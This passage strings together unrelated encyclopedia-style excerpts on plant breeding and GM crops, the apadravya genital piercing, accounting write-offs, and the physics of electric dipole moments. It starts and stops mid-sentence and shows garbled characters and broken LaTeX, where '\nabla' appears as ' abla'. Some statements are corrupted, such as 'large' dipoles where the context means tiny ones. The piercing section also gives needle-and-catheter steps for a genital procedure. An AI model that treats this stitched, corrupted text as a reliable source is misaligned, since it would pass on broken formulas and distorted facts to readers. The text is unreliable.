rhizogenes, or by direct methods like the gene gun or microinjection. Using plant viruses to insert genetic constructs into plants is also a possibility, but the technique is limited by the host range of the virus. For example, Cauliflower mosaic virus (CaMV) only infects cauliflower and related species. Another limitation of viral vectors is that the virus is not usually passed on to the progeny, so every plant has to be inoculated. The majority of commercially released transgenic plants are currently limited to plants that have introduced resistance to insect pests and herbicides. Insect resistance is achieved through incorporation of a gene from Bacillus thuringiensis (Bt) that encodes a protein that is toxic to some insects. For example, the cotton bollworm, a common cotton pest, feeds on Bt cotton it will ingest the toxin and die. Herbicides usually work by binding to certain plant enzymes and inhibiting their action. The enzymes that the herbicide inhibits are known as the herbicides target site. Herbicide resistance can be engineered into crops by expressing a version of target site protein that is not inhibited by the herbicide. This is the method used to produce glyphosate resistant (\\"Roundup Ready\\") crop plants. Genetic modification can further increase yields by increasing stress tolerance to a given environment. Stresses such as temperature variation, are signalled to the plant via a cascade of signalling molecules which will activate a transcription factor to regulate gene expression. Overexpression of particular genes involved in cold acclimation has been shown to produce more resistance to freezing, which is one common cause of yield loss Genetic modification of plants that can produce pharmaceuticals (and industrial chemicals), sometimes called pharming, is a rather radical new area of plant breeding.  Issues and concerns  Modern plant breeding, whether classical or through genetic engineering, comes with issues of concern, particularly with regard to food crops. The question of whether breeding can have a negative effect on nutritional value is central in this respect. Although relatively little direct research in this area has been done, there are scientific indications that, by favoring certain aspects of a plant's development, other aspects may be retarded. A study published in the Journal of the American College of Nutrition in 2004, entitled Changes in USDA Food Composition Data for 43 Garden Crops, 1950 to 1999, compared nutritional analysis of vegetables done in 1950 and in 1999, and found substantial decreases in six of 13 nutrients measured, including 6% of protein and 38% of riboflavin. Reductions in calcium, phosphorus, iron and ascorbic acid were also found. The study, conducted at the Biochemical Institute, University of Texas at Austin, concluded in summary: \\"We suggest that any real declines are generally most easily explained by changes in cultivated varieties between 1950 and 1999, in which there may be trade-offs between yield and nutrient content.\\" The debate surrounding genetically modified food during the 1990s peaked in 1999 in terms of media coverage and risk perception, and continues today ‚Äì for example, \\"Germany has thrown its weight behind a growing European mutiny over genetically modified crops by banning the planting of a widely grown pest- resistant corn variety.\\" The debate encompasses the ecological impact of genetically modified plants, the safety of genetically modified food and concepts used for safety evaluation like substantial equivalence. Such concerns are not new to plant breeding. Most countries have regulatory processes in place to help ensure that new crop varieties entering the marketplace are both safe and meet farmers' needs. Examples include variety registration, seed schemes, regulatory authorizations for GM plants, etc. Plant breeders' rights is also a major and controversial issue. Today, production of new varieties is dominated by commercial plant breeders, who seek to protect their work and collect royalties through national and international agreements based in intellectual property rights. The range of related issues is complex. In the simplest terms, critics of the increasingly restrictive regulations argue that, through a combination of technical and economic pressures, commercial breeders are reducing biodiversity and significantly constraining individuals (such as farmers) from developing and trading seed on a regional level. Efforts to strengthen breeders' rights, for example, by lengthening periods of variety protection, are ongoing. When new plant breeds or cultivars are bred, they must be maintained and propagated. Some plants are propagated by asexual means while others are propagated by seeds. Seed propagated cultivars require specific control over seed source and production procedures to maintain the integrity of the plant breeds results. Isolation is necessary to prevent cross contamination with related plants or the mixing of seeds after harvesting. Isolation is normally accomplished by planting distance but in certain crops, plants are enclosed in greenhouses or cages (most commonly used when producing F1 hybrids).  Role of plant breeding in organic agriculture  Critics of organic agriculture claim it is too low-yielding to be a viable alternative to conventional agriculture. However, part of that poor performance may be the result of growing poorly adapted varieties. It is estimated that over 95% of organic agriculture is based on conventionally adapted varieties, even though the production environments found in organic vs. conventional farming systems are vastly different due to their distinctive management practices. Most notably, organic farmers have fewer inputs available than conventional growers to control their production environments. Breeding varieties specifically adapted to the unique conditions of organic agriculture is critical for this sector to realize its full potential. This requires selection for traits such as: * Water use efficiency * Nutrient use efficiency (particularly nitrogen and phosphorus) * Weed competitiveness * Tolerance of mechanical weed control * Pest/disease resistance * Early maturity (as a mechanism for avoidance of particular stresses) * Abiotic stress tolerance (i.e. drought, salinity, etc...) Currently, few breeding programs are directed at organic agriculture and until recently those that did address this sector have generally relied on indirect selection (i.e. selection in conventional environments for traits considered important for organic agriculture). However, because the difference between organic and conventional environments is large, a given genotype may perform very differently in each environment due to an interaction between genes and the environment (see gene-environment interaction). If this interaction is severe enough, an important trait required for the organic environment may not be revealed in the conventional environment, which can result in the selection of poorly adapted individuals. To ensure the most adapted varieties are identified, advocates of organic breeding now promote the use of direct selection (i.e. selection in the target environment) for many agronomic traits. There are many classical and modern breeding techniques that can be utilized for crop improvement in organic agriculture despite the ban on genetically modified organisms. For instance, controlled crosses between individuals allow desirable genetic variation to be recombined and transferred to seed progeny via natural processes. Marker assisted selection can also be employed as a diagnostics tool to facilitate selection of progeny who possess the desired trait(s), greatly speeding up the breeding process. This technique has proven particularly useful for the introgression of resistance genes into new backgrounds, as well as the efficient selection of many resistance genes pyramided into a single individual. Unfortunately, molecular markers are not currently available for many important traits, especially complex ones controlled by many genes.  Breeding and food security  For agriculture to thrive in the future, changes must be made to address arising global issues. These issues are the lack of arable land, increasingly harsh cropping conditions and the need to maintain food security, which involves being able to provide the world population with sufficient nutrition. Crops need to be able to mature in multiple environments to allow worldwide access, which involves solving problems including drought tolerance. It has been suggested that global solutions are achievable through the process of plant breeding, with its ability to select specific genes allowing crops to perform at a level which yields the desired results. = Yield = With an increasing population, the production of food needs to increase with it. It is estimated that a 70% increase in food production is needed by 2050 in order to meet the Declaration of the World Summit on Food Security. But with the degradation of agricultural land, simply planting more crops is no longer a viable option. New varieties of plants can in some cases be developed through plant breeding that generate an increase of yield without relying on an increase in land area. An example of this can be seen in Asia, where food production per capita has increased twofold. This has been achieved through not only the use of fertilisers, but through the use of better crops that have been specifically designed for the area. = Nutritional value = Plant breeding can contribute to global food security as it is a cost-effective tool for increasing nutritional value of forage and crops. Improvements in nutritional value for forage crops from the use of analytical chemistry and rumen fermentation technology have been recorded since 1960; this science and technology gave breeders the ability to screen thousands of samples within a small amount of time, meaning breeders could identify a high performing hybrid quicker. The genetic improvement was mainly in vitro dry matter digestibility (IVDMD) resulting in 0.7-2.5% increase, at just 1% increase in IVDMD a single Bos Taurus also known as beef cattle reported 3.2% increase in daily gains. This improvement indicates plant breeding is an essential tool in gearing future agriculture to perform at a more advanced level. = Environmental stressors = Plant breeding of hybrid crops has become extremely popular worldwide in an effort to combat the harsh environment. With long periods of drought and lack of water or nitrogen stress tolerance has become a significant part of agriculture. Plant breeders have focused on identifying crops which will ensure crops perform under these conditions; a way to achieve this is finding strains of the crop that is resistance to drought conditions with low nitrogen. It is evident from this that plant breeding is vital for future agriculture to survive as it enables farmers to produce stress resistant crops hence improving food security. In countries that experience harsh winters such as Iceland, Germany and further east in Europe, plant breeders are involved in breeding for tolerance to frost, continuous snow-cover, frost-drought (desiccation from wind and solar radiation under frost) and high moisture levels in soil in winter.Link, W.; Balko, C.; Stoddard, F.; Winter hardiness in faba bean: Physiology and breeding.

A Framework For Analizing Participatory Plant Breeding Approaches And Results. Ceccarelli 2001. Decentralized-Participatory Plant Breeding: Adapting Crops to Environments and Clients Participatory approaches to crop improvement can also be applied when plant biotechnologies are being used for crop improvement. Local agricultural systems and genetic diversity are developed and strengthened by crop improvement, which participatory crop improvement (PCI) plays a large role. PPB is enhanced by farmers knowledge of the quality required and evaluation of target environment which affects the effectiveness of PPB.

While the ampallang passes horizontally through the glans, the apadravya passes vertically through the glans from top to bottom, almost always placed centrally and passing through the urethra. It can be paired with an ampallang to form the magic cross. Off-center apadravyas are also possible, wherein the piercing is deliberately offset, yet usually still passes through the urethra. The piercing is often done on a slightly forward angle to the hips. Terminology Apadravya () is the generic name used in Kama Sutra for prostheses to increase the size of penis during intercourse, primarily to satisfy a woman classified as hastini (‡§π‡§∏‡•ç‡§§‡§ø‡§®‡•Ä, 'she-elephant').

Indeed, traditional palang design is simply a pin used to accommodate a wooden glans cape extensionBorneo Artifact - Giant PENIS PALANG Male PIERCING and hence, the term apadravya in this context refers to the glans cape extension and not to the palang itself. Nevertheless, it was Doug Malloy in the 1970s who labelled the vertical glans piercing as \\"apadravya\\" and the horizontal one as \\"ampallang.\\"Ampallangs and Apadravyas Procedure An apadravya is usually done in one session, though sometimes in two; the first creating a Prince Albert and the second (after healing) completing the apadravya. Straight barbells are the usual jewelry for apadravya piercings. The barbell must be long enough to accommodate erection and initial swelling. The apadravya is usually pierced with a slightly longer barbell than required for a fully healed piercing, and downsizing the length can be required. The barbell can also end with the second ball inside the urethra. The diameter of the initial barbell is usually 2.0 or 2.4 mm (12 or 10 gauge). The healing time of an apadravya piercing can vary greatly depending on healing rate and diligence of the aftercare. Usually one can have penetrative intercourse with a condom after about one month, although the person with the piercing will still feel pain. Normally it takes at least three to nine months for the piercing to fully heal. After initial healing the piercing can be gradually stretched and larger jewelry can be inserted, reaching sizes above 10 mm in diameter. The piercing should be done in three steps. First a catheter is inserted. Then the needle up from the bottom into the catheter to ensure straightness and that its actually going through the urethra. Then the catheter is removed and the needle pushed up to the top of the glans. Because it passes through the most sensitive part of the penis, the procedure is among the most painful of male genital piercings. Functions Apadravya is one of the functional genital piercings; it enhances sexual pleasure. In homosexual anal sex, compared to the more common Prince Albert (and its counterpart Reverse Prince Albert piercing), apadravya has the advantage of stimulating the prostate in both rear entry and missionary. It is generally thought of as the most pleasurable for female sexual partners because, compared to Prince Albert, it reportedly allows stimulation of both the G-spot and A-spot in vaginal intercourse. Some men choose to wear special vibrating jewellery during sex, which further enhances pleasure.Enjoying the Apadravya Piercing Sometimes the apadravya is referred to as happydravya because it is said that having sex with a person who has this piercing is highly pleasurable. Variations Variations include the shaft apadravya which pierces the shaft (uncommon, and not performed by many piercers); the magic cross which is a combination of the apadravya and the ampallang; and the apadydoe. If the penis has been subincised or meatotomized, the piercing is called a halfadravya.

In accounting, this is a recognition of the reduced or zero value of an asset. In income tax statements, this is a reduction of taxable income, as a recognition of certain expenses required to produce the income. Income tax In income tax calculation, a write-off is the itemized deduction of an item's value from a person's taxable income. Thus, if a person in the United States has a taxable income of $50,000 per year, a $100 telephone for business use would lower the taxable income to $49,900. If that person is in a 25% tax bracket, the tax due would be lowered by $25. Thus the net cost of the telephone is $75 instead of $100. Accounting In business accounting, the term write-off is used to refer to an investment (such as a purchase of sellable goods) for which a return on the investment is now impossible or unlikely. The item's potential return is thus canceled and removed from (\\"written off\\") the business's balance sheet. Common write-offs in retail include spoiled and damaged goods. In commercial or industrial settings, a productive asset may be subject to write-off if it suffers failure or accident damage that is infeasible to repair, leaving the asset unusable for its intended purpose. Banking Similarly, banks write off bad debt that is declared non collectable (such as a loan on a defunct business, or a credit card due that is in default), removing it from their balance sheets. A reduction in the value of an asset or earnings by the amount of an expense or loss. Companies are able to write off certain expenses that are required to run the business, or have been incurred in the operation of the business and detract from retained revenues. Negative write-offs A negative write-off refers to the decision not to pay back an individual or organization that has overpaid on an account. Negative write-offs can sometimes be seen as fraudulent activity if those who overpay a claim or bill are not informed that they have overpaid and are not given any chance to reconcile their overpayment or be refunded. Some institutions such as banks, hospitals, universities, and other large organizations regularly perform negative write-offs, especially when the amount is considered low (e.g., $5 at some institutions or up to $15 or more at others). Writedown A writedown is an accounting treatment that recognizes the reduced value of an impaired asset. The value of an asset may change due to fundamental changes in technology or markets. One example is when one company purchases another and pays more than the net fair value of its assets and liabilities. The excess purchase price is recorded on the buying company's accounts as goodwill. If it becomes apparent that the purchased asset no longer has the value recorded in the goodwill account (i.e., if the asset cannot be resold at the same price), the value in the goodwill asset account is \\"written down\\". One example is when Rupert Murdoch's News Corp bought Wall Street Journal publisher Dow Jones at a 60% premium in 2007, which News Corp. later had to write down by $2.8 billion because of declining advertising revenues. A writedown is sometimes considered synonymous with a write-off. The distinction is that while a write-off is generally completely removed from the balance sheet, a writedown leaves the asset with a lower value. As an example, one of the consequences of the 2007 subprime crisis for financial institutions was a revaluation under mark to market rules: \\"Washington Mutual will write down by $150 million the value of $17 billion in loans\\".

All generate the same field profile when the arrangement is infinitesimally small. The electric dipole moment is a measure of the separation of positive and negative electrical charges within a system, that is, a measure of the system's overall polarity. The SI units for electric dipole moment are coulomb-meter (C‚ãÖm); however, a commonly used unit in atomic physics and chemistry is the debye (D). Theoretically, an electric dipole is defined by the first-order term of the multipole expansion; it consists of two equal and opposite charges that are infinitesimally close together, although real dipoles have separated charge.Many theorists predict elementary particles can have very tiny electric dipole moments, possibly without separated charge. Such large dipoles make no difference to everyday physics, and have not yet been observed. (See electron electric dipole moment). However, when making measurements at a distance much larger than the charge separation, the dipole gives a good approximation of the actual electric field. The dipole is represented by a vector from the negative charge towards the positive charge. Elementary definition Quantities defining the electric dipole moment of two point charges. Often in physics the dimensions of a massive object can be ignored and can be treated as a pointlike object, i.e. a point particle. Point particles with electric charge are referred to as point charges. Two point charges, one with charge +q and the other one with charge ‚àíq separated by a distance d, constitute an electric dipole (a simple case of an electric multipole). For this case, the electric dipole moment has a magnitude : p = qd and is directed from the negative charge to the positive one. Some authors may split d in half and use s = d/2 since this quantity is the distance between either charge and the center of the dipole, leading to a factor of two in the definition. A stronger mathematical definition is to use vector algebra, since a quantity with magnitude and direction, like the dipole moment of two point charges, can be expressed in vector form : \\\\mathbf{p} = q\\\\mathbf{d} where d is the displacement vector pointing from the negative charge to the positive charge. The electric dipole moment vector p also points from the negative charge to the positive charge. An idealization of this two-charge system is the electrical point dipole consisting of two (infinite) charges only infinitesimally separated, but with a finite p. This quantity is used in the definition of polarization density. Energy and torque Electric dipole p and its torque œÑ in a uniform E field. An object with an electric dipole moment is subject to a torque œÑ when placed in an external electric field. The torque tends to align the dipole with the field. A dipole aligned parallel to an electric field has lower potential energy than a dipole making some angle with it. For a spatially uniform electric field E, the energy U and the torque \\\\boldsymbol{\\\\tau} are given by :U = - \\\\mathbf{p} \\\\cdot \\\\mathbf{E},\\\\qquad\\\\ \\\\boldsymbol{\\\\tau} = \\\\mathbf{p} \\\\times \\\\mathbf{E}, where p is the dipole moment, and the symbol \\"√ó\\" refers to the vector cross product. The field vector and the dipole vector define a plane, and the torque is directed normal to that plane with the direction given by the right-hand rule. A dipole oriented co- or anti-parallel to the direction in which a non-uniform electric field is increasing (gradient of the field) will experience a torque, as well as a force in the direction of its dipole moment. It can be shown that this force will always be parallel to the dipole moment regardless of co- or anti- parallel orientation of the dipole. Expression (general case) More generally, for a continuous distribution of charge confined to a volume V, the corresponding expression for the dipole moment is: :\\\\mathbf{p}(\\\\mathbf{r}) = \\\\int\\\\limits_{V} \\\\rho(\\\\mathbf{r}_0)\\\\, \\\\left(\\\\mathbf{r}_0 - \\\\mathbf{r}\\\\right) \\\\ d^3 \\\\mathbf{r}_0, where r locates the point of observation and d3r0 denotes an elementary volume in V. For an array of point charges, the charge density becomes a sum of Dirac delta functions: :\\\\rho(\\\\mathbf{r}) = \\\\sum_{i=1}^N \\\\, q_i \\\\, \\\\delta \\\\left(\\\\mathbf{r} - \\\\mathbf{r}_i\\\\right), where each ri is a vector from some reference point to the charge qi. Substitution into the above integration formula provides: : \\\\mathbf{p}(\\\\mathbf{r}) = \\\\sum_{i=1}^N \\\\, q_i \\\\int\\\\limits_V \\\\delta\\\\left(\\\\mathbf{r}_0 - \\\\mathbf{r}_i\\\\right)\\\\, \\\\left(\\\\mathbf{r}_0 - \\\\mathbf{r}\\\\right)\\\\ d^3 \\\\mathbf{r}_0 = \\\\sum_{i=1}^N \\\\, q_i \\\\left(\\\\mathbf{r}_i - \\\\mathbf{r}\\\\right). This expression is equivalent to the previous expression in the case of charge neutrality and N = 2. For two opposite charges, denoting the location of the positive charge of the pair as r+ and the location of the negative charge as r‚àí : : \\\\mathbf{p}(\\\\mathbf{r}) = q_1(\\\\mathbf{r}_1 - \\\\mathbf{r}) + q_2(\\\\mathbf{r}_2 - \\\\mathbf{r}) = q(\\\\mathbf{r}_+ -\\\\mathbf{r})-q(\\\\mathbf{r}_- - \\\\mathbf{r}) = q (\\\\mathbf{r}_+ - \\\\mathbf{r}_-) = q\\\\mathbf{d}, showing that the dipole moment vector is directed from the negative charge to the positive charge because the position vector of a point is directed outward from the origin to that point. The dipole moment is particularly useful in the context of an overall neutral system of charges, for example a pair of opposite charges, or a neutral conductor in a uniform electric field. For such a system of charges, visualized as an array of paired opposite charges, the relation for electric dipole moment is: :\\\\begin{align} \\\\mathbf{p}(\\\\mathbf{r}) &= \\\\sum_{i=1}^N\\\\, \\\\int\\\\limits_V q_i \\\\left[\\\\delta \\\\left(\\\\mathbf{r}_0 - \\\\left(\\\\mathbf{r}_i + \\\\mathbf{d}_i\\\\right)\\\\right) - \\\\delta\\\\left(\\\\mathbf{r}_0 - \\\\mathbf{r}_i\\\\right)\\\\right]\\\\, \\\\left(\\\\mathbf{r}_0 - \\\\mathbf{r}\\\\right)\\\\ d^3 \\\\mathbf{r}_0 \\\\\\\\\\\\ &= \\\\sum_{i=1}^N\\\\, q_i\\\\, \\\\left[\\\\mathbf{r}_i + \\\\mathbf{d}_i - \\\\mathbf{r} - \\\\left(\\\\mathbf{r}_i - \\\\mathbf{r}\\\\right)\\\\right] \\\\\\\\\\\\ &= \\\\sum_{i=1}^N q_i \\\\mathbf{d}_i = \\\\sum_{i=1}^{N} \\\\mathbf{p}_i \\\\ , \\\\end{align} where r is the point of observation, and di = ri ‚àí ri, ri being the position of the negative charge in the dipole i, and ri the position of the positive charge. This is the vector sum of the individual dipole moments of the neutral charge pairs. (Because of overall charge neutrality, the dipole moment is independent of the observer's position r.) Thus, the value of p is independent of the choice of reference point, provided the overall charge of the system is zero. When discussing the dipole moment of a non-neutral system, such as the dipole moment of the proton, a dependence on the choice of reference point arises. In such cases it is conventional to choose the reference point to be the center of mass of the system, not some arbitrary origin. This choice is not only a matter of convention: the notion of dipole moment is essentially derived from the mechanical notion of torque, and as in mechanics, it is computationally and theoretically useful to choose the center of mass as the observation point. For a charged molecule the center of charge should be the reference point instead of the center of mass. For neutral systems the references point is not important. The dipole moment is an intrinsic property of the system. Potential and field of an electric dipole physical electric dipole. Negative potentials are in blue; positive potentials, in red. An ideal dipole consists of two opposite charges with infinitesimal separation. We compute the potential and field of such an ideal dipole starting with two opposite charges at separation d > 0, and taking the limit as d ‚Üí 0. Two closely spaced opposite charges ¬±q have a potential of the form: :\\\\phi(\\\\mathbf{r}) \\\\ =\\\\ \\\\frac{q}{4 \\\\pi \\\\varepsilon _0 \\\\left\\\\mathbf{r} - \\\\mathbf{r}_+\\\\right} - \\\\frac{q}{4 \\\\pi \\\\varepsilon _0 \\\\left\\\\mathbf{r} - \\\\mathbf{r}_-\\\\right}\\\\ , where the charge separation is: :\\\\mathbf{d} = \\\\mathbf{r}_+ - \\\\mathbf{r}_-\\\\ , \\\\ \\\\ \\\\ d = \\\\mathbf{d}\\\\,. Let R denote the position vector relative to the midpoint r, and \\\\hat\\\\mathbf{R} the corresponding unit vector: :\\\\mathbf{R} = \\\\mathbf{r} - \\\\frac{\\\\mathbf{r}_+ + \\\\mathbf{r}_-}{2}, \\\\quad \\\\hat{\\\\mathbf{R}} = \\\\frac{\\\\mathbf{R}}{R}\\\\ , Taylor expansion in \\\\tfrac dR (see multipole expansion and quadrupole) expresses this potential as a series. :\\\\phi(\\\\mathbf{R}) \\\\ =\\\\ \\\\frac{1}{4 \\\\pi \\\\varepsilon _0} \\\\frac{q\\\\mathbf{d} \\\\cdot \\\\hat{\\\\mathbf{R}}}{R^2} + O\\\\left(\\\\frac{d^2}{R^2}\\\\right) \\\\ \\\\approx\\\\ \\\\frac{1}{4 \\\\pi \\\\varepsilon _0} \\\\frac{\\\\mathbf{p} \\\\cdot \\\\hat{\\\\mathbf{R}}}{R^2}\\\\ , where higher order terms in the series are vanishing at large distances, R, compared to d. Each succeeding term provides a more detailed view of the distribution of charge, and falls off more rapidly with distance. For example, the quadrupole moment is the basis for the next term: :Q_{ij} = \\\\int d^3 \\\\mathbf{r}_0 \\\\left(3 x_i x_j - r_0^2 \\\\delta_{ij}\\\\right) \\\\rho\\\\left(\\\\mathbf{r}_0\\\\right)\\\\ , with r0 = (x1, x2, x3). See Here, the electric dipole moment p is, as above: :\\\\mathbf{p} = q\\\\mathbf{d}\\\\ . The result for the dipole potential also can be expressed as: :\\\\phi(\\\\mathbf{R}) = -\\\\mathbf{p} \\\\cdot \\\\mathbf{ abla} \\\\frac{1}{4 \\\\pi \\\\varepsilon _0 R}\\\\ , which relates the dipole potential to that of a point charge. A key point is that the potential of the dipole falls off faster with distance R than that of the point charge. The electric field of the dipole is the negative gradient of the potential, leading to: :\\\\mathbf E\\\\left(\\\\mathbf R\\\\right) = \\\\frac{3\\\\left(\\\\mathbf{p} \\\\cdot \\\\hat{\\\\mathbf{R}}\\\\right) \\\\hat{\\\\mathbf{R}} - \\\\mathbf{p}}{4 \\\\pi \\\\varepsilon_0 R^3}\\\\ . Thus, although two closely spaced opposite charges are not quite an ideal electric dipole (because their potential at short distances is not that of a dipole), at distances much larger than their separation, their dipole moment p appears directly in their potential and field. As the two charges are brought closer together (d is made smaller), the dipole term in the multipole expansion based on the ratio d/R becomes the only significant term at ever closer distances R, and in the limit of infinitesimal separation the dipole term in this expansion is all that matters. As d is made infinitesimal, however, the dipole charge must be made to increase to hold p constant. This limiting process results in a \\"point dipole\\". Dipole moment density and polarization density The dipole moment of an array of charges, :\\\\mathbf p = \\\\sum_{i=1}^N \\\\ q_i \\\\mathbf {d_i} \\\\ , determines the degree of polarity of the array, but for a neutral array it is simply a vector property of the array with no information about the array's absolute location. The dipole moment density of the array p(r) contains both the location of the array and its dipole moment. When it comes time to calculate the electric field in some region containing the array, Maxwell's equations are solved, and the information about the charge array is contained in the polarization density P(r) of Maxwell's equations. Depending upon how fine-grained an assessment of the electric field is required, more or less information about the charge array will have to be expressed by P(r). As explained below, sometimes it is sufficiently accurate to take P(r) = p(r). Sometimes a more detailed description is needed (for example, supplementing the dipole moment density with an additional quadrupole density) and sometimes even more elaborate versions of P(r) are necessary. It now is explored just in what way the polarization density P(r) that enters Maxwell's equations is related to the dipole moment p of an overall neutral array of charges, and also to the dipole moment density p(r) (which describes not only the dipole moment, but also the array location). Only static situations are considered in what follows, so P(r) has no time dependence, and there is no displacement current. First is some discussion of the polarization density P(r). That discussion is followed with several particular examples. A formulation of Maxwell's equations based upon division of charges and currents into \\"free\\" and \\"bound\\" charges and currents leads to introduction of the D- and P-fields: : \\\\mathbf{D} = \\\\varepsilon _0 \\\\mathbf{E} + \\\\mathbf{P}\\\\ , where P is called the polarization density. In this formulation, the divergence of this equation yields: : abla \\\\cdot \\\\mathbf{D} = \\\\rho_f = \\\\varepsilon _0 abla \\\\cdot \\\\mathbf{E} + abla \\\\cdot \\\\mathbf{P}\\\\ , and as the divergence term in E is the total charge, and œÅf is \\"free charge\\", we are left with the relation: : abla \\\\cdot \\\\mathbf{P} = -\\\\rho_b \\\\ , with œÅb as the bound charge, by which is meant the difference between the total and the free charge densities. As an aside, in the absence of magnetic effects, Maxwell's equations specify that : abla \\\\times \\\\mathbf{E} = \\\\boldsymbol{0}\\\\ , which implies : abla \\\\times \\\\left( \\\\mathbf{D} - \\\\mathbf{P} \\\\right) = \\\\boldsymbol{0}\\\\ , Applying Helmholtz decomposition: : \\\\mathbf{ D-P = - abla } \\\\varphi \\\\ , for some scalar potential œÜ, and: : abla \\\\cdot (\\\\mathbf{D} - \\\\mathbf{P}) = \\\\varepsilon_0 abla \\\\cdot \\\\mathbf{E} = \\\\rho_f + \\\\rho_b = - abla^2 \\\\varphi\\\\ . Suppose the charges are divided into free and bound, and the potential is divided into :\\\\varphi = \\\\varphi_f + \\\\varphi_b\\\\ . Satisfaction of the boundary conditions upon œÜ may be divided arbitrarily between œÜf and œÜb because only the sum œÜ must satisfy these conditions. It follows that P is simply proportional to the electric field due to the charges selected as bound, with boundary conditions that prove convenient. For example, one could place the boundary around the bound charges at infinity. Then œÜb falls off with distance from the bound charges. If an external field is present, and zero free charge, the field can be accounted for in the contribution of œÜf, which would arrange to satisfy the boundary conditions and Laplace's equation : abla^2 \\\\varphi_f = 0\\\\ . In principle, one could add the same arbitrary curl to both D and P, which would cancel out of the difference D ‚àí P. However, assuming D and P originate in a simple division of charges into free and bound, they a formally similar to electric fields and so have zero curl. In particular, when no free charge is present, one possible choice is P = Œµ0 E. Next is discussed how several different dipole moment descriptions of a medium relate to the polarization entering Maxwell's equations. =Medium with charge and dipole densities= As described next, a model for polarization moment density p(r) results in a polarization :\\\\mathbf{P}(\\\\mathbf{r}) = \\\\mathbf{p}(\\\\mathbf{r}) \\\\, restricted to the same model. For a smoothly varying dipole moment distribution p(r), the corresponding bound charge density is simply : abla \\\\cdot \\\\mathbf{p} (\\\\mathbf{r}) = \\\\rho_b, as we will establish shortly via integration by parts. However, if p(r) exhibits an abrupt step in dipole moment at a boundary between two regions, ‚àá¬∑p(r) results in a surface charge component of bound charge. This surface charge can be treated through a surface integral, or by using discontinuity conditions at the boundary, as illustrated in the various examples below. As a first example relating dipole moment to polarization, consider a medium made up of a continuous charge density œÅ(r) and a continuous dipole moment distribution p(r). This medium can be seen as an idealization growing from the multipole expansion of the potential of an arbitrarily complex charge distribution, truncation of the expansion, and the forcing of the truncated form to apply everywhere. The result is a hypothetical medium. See The potential at a position r is: :\\\\phi (\\\\mathbf{r}) = \\\\frac{1}{4 \\\\pi \\\\varepsilon_0} \\\\int \\\\frac{\\\\rho \\\\left(\\\\mathbf{r}_0\\\\right)}{\\\\left\\\\mathbf{r} - \\\\mathbf{r}_0\\\\right} d^3 \\\\mathbf{r}_0 \\\\ + \\\\frac {1}{4 \\\\pi \\\\varepsilon_0}\\\\int \\\\frac{\\\\mathbf{p} \\\\left(\\\\mathbf{r}_0\\\\right) \\\\cdot \\\\left(\\\\mathbf{r} - \\\\mathbf{r}_0\\\\right)} { \\\\mathbf{r} - \\\\mathbf{r}_0 ^3 } d^3 \\\\mathbf{ r}_0 , where œÅ(r) is the unpaired charge density, and p(r) is the dipole moment density. For example, for a system of ideal dipoles with dipole moment p confined within some closed surface, the dipole density p(r) is equal to p inside the surface, but is zero outside. That is, the dipole density includes a Heaviside step function locating the dipoles inside the surface. Using an identity: : abla_{\\\\mathbf{r}_0} \\\\frac{1}{\\\\left\\\\mathbf{r} - \\\\mathbf{r}_0\\\\right} = \\\\frac{\\\\mathbf{r} - \\\\mathbf{r}_0}{\\\\left\\\\mathbf{r} - \\\\mathbf{r}_0\\\\right^3} the polarization integral can be transformed: : \\\\begin{align} &\\\\frac{1}{4 \\\\pi \\\\varepsilon_0} \\\\int \\\\frac{\\\\mathbf{p} \\\\left(\\\\mathbf{r}_0\\\\right) \\\\cdot (\\\\mathbf{r} - \\\\mathbf{r}_0)}{\\\\left\\\\mathbf{r} - \\\\mathbf{r}_0\\\\right^3 } d^3 \\\\mathbf{ r}_0 = \\\\frac {1}{4 \\\\pi \\\\varepsilon_0}\\\\int \\\\mathbf{p} \\\\left(\\\\mathbf{r}_0\\\\right) \\\\cdot abla_{\\\\mathbf{r}_0} \\\\frac{1}{\\\\left\\\\mathbf{r} - \\\\mathbf{r}_0\\\\right} d^3 \\\\mathbf{r}_0 , \\\\\\\\\\\\ ={} &\\\\frac{1}{4 \\\\pi \\\\varepsilon_0} \\\\int abla_{\\\\mathbf{r}_0} \\\\cdot \\\\left(\\\\mathbf{p} \\\\left(\\\\mathbf{r}_0\\\\right) \\\\frac {1}{\\\\left\\\\mathbf{r} - \\\\mathbf{r}_0\\\\right}\\\\right) d^3 \\\\mathbf{r}_0 - \\\\frac{1}{4 \\\\pi \\\\varepsilon_0} \\\\int \\\\frac{ abla_{\\\\mathbf{r}_0} \\\\cdot \\\\mathbf{p} \\\\left(\\\\mathbf{r}_0\\\\right)}{\\\\left\\\\mathbf{r} - \\\\mathbf{r}_0\\\\right} d^3 \\\\mathbf{r}_0 , \\\\end{align} The first term can be transformed to an integral over the surface bounding the volume of integration, and contributes a surface charge density, discussed later. Putting this result back into the potential, and ignoring the surface charge for now: :\\\\phi (\\\\mathbf{r}) = \\\\frac{1}{4 \\\\pi \\\\varepsilon_0} \\\\int \\\\frac{\\\\rho \\\\left(\\\\mathbf{r}_0\\\\right) - abla_{\\\\mathbf{r}_0} \\\\cdot \\\\mathbf{p} \\\\left(\\\\mathbf{r}_0\\\\right)}{\\\\left\\\\mathbf{r} - \\\\mathbf{r}_0\\\\right} d^3 \\\\mathbf{r}_0\\\\ , where the volume integration extends only up to the bounding surface, and does not include this surface. The potential is determined by the total charge, which the above shows consists of: :\\\\rho_\\\\text{total} \\\\left(\\\\mathbf{r}_0\\\\right) = \\\\rho\\\\left(\\\\mathbf{r}_0\\\\right) - abla_{\\\\mathbf{r}_0} \\\\cdot \\\\mathbf{p} \\\\left(\\\\mathbf{r}_0\\\\right)\\\\ , showing that: :- abla_{\\\\mathbf{r}_0} \\\\cdot \\\\mathbf{p} \\\\left(\\\\mathbf{r}_0\\\\right) = \\\\rho_b\\\\ . In short, the dipole moment density p(r) plays the role of the polarization density P for this medium. Notice, p(r) has a non-zero divergence equal to the bound charge density (as modeled in this approximation). It may be noted that this approach can be extended to include all the multipoles: dipole, quadrupole, etc. Using the relation: : abla \\\\cdot \\\\mathbf{D} = \\\\rho_f \\\\ , the polarization density is found to be: :\\\\mathbf{P}(\\\\mathbf{r}) = \\\\mathbf{p}_\\\\text{dip} - abla \\\\cdot \\\\mathbf{p}_\\\\text{quad} + \\\\ldots\\\\ , where the added terms are meant to indicate contributions from higher multipoles. Evidently, inclusion of higher multipoles signifies that the polarization density P no longer is determined by a dipole moment density p alone. For example, in considering scattering from a charge array, different multipoles scatter an electromagnetic wave differently and independently, requiring a representation of the charges that goes beyond the dipole approximation. See and Surface charge A uniform array of identical dipoles is equivalent to a surface charge. Above, discussion was deferred for the first term in the expression for the potential due to the dipoles. Integrating the divergence results in a surface charge. The figure at the right provides an 